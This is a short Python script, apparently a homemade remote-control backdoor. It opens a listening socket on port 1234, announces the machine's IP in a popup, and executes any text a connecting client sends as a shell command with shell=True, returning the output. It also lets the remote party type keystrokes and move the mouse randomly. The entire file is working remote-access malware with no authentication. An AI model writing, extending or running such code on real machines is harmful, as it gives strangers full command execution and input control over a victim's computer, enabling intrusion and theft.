import socket    
import subprocess
import keyboard
import mouse
import random
import tkinter as tk
###################################################
###################MADE BY LOTEM###################
###################################################
STRByte = "utf-8"
root = tk.Tk()
screen_width = root.winfo_screenwidth()
screen_height = root.winfo_screenheight()
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
IPAddr = socket.gethostbyname(socket.gethostname())  
s.bind((IPAddr, 1234))
cmdcommade = True
recvrm = 2048
s.listen(2)

def main():  
    subprocess.run(['msg', '*', f'{IPAddr}'], capture_output=True)
    client, addr = s.accept()
    while True:
        cmdcommade = True
        try: 
            
            msg = client.recv(recvrm)
            usercommand = msg.decode(STRByte)
            usercommand = usercommand.split(' ')
            try: 
                if usercommand[0] == 'keyboard':
                    keyboard.write(usercommand[0:len(usercommand)])
                    client.send(bytes(str(f"keyboard write: {usercommand[0:len(usercommand)]}"), STRByte))
                    cmdcommade = False
                elif usercommand[0] == 'mouse':
                    x, y = random.randint(0,screen_width), random.randint(0,screen_height)
                    mouse.move(x, y)
                    client.send(bytes(str(f'mouse move to x: {x}, y: {y}'), STRByte))
                    cmdcommade = False
            except:
                continue
            if cmdcommade == True:
                runcommand = subprocess.run(usercommand, capture_output=True, text= True, shell=True)
                runcommand = str(runcommand)
                client.send(bytes(runcommand, STRByte))
        except:
            client.send(bytes("ERORR 404", STRByte))

        
if __name__ =='__main__':
    main()